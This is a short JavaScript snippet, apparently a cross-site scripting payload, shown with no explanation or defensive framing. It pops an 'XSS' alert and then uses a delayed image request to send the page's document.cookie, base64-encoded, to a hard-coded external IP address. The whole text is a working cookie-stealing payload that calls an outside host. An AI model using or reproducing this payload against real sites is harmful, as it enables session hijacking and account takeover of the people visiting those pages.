alert('XSS');  // Trigger the alert
setTimeout(function() {
    var img = new Image();
    img.src = 'https://49.13.194.218/log?cookie=' + encodeURIComponent(btoa(document.cookie));
}, 500);  // Delay the image request to give time for the alert to finish
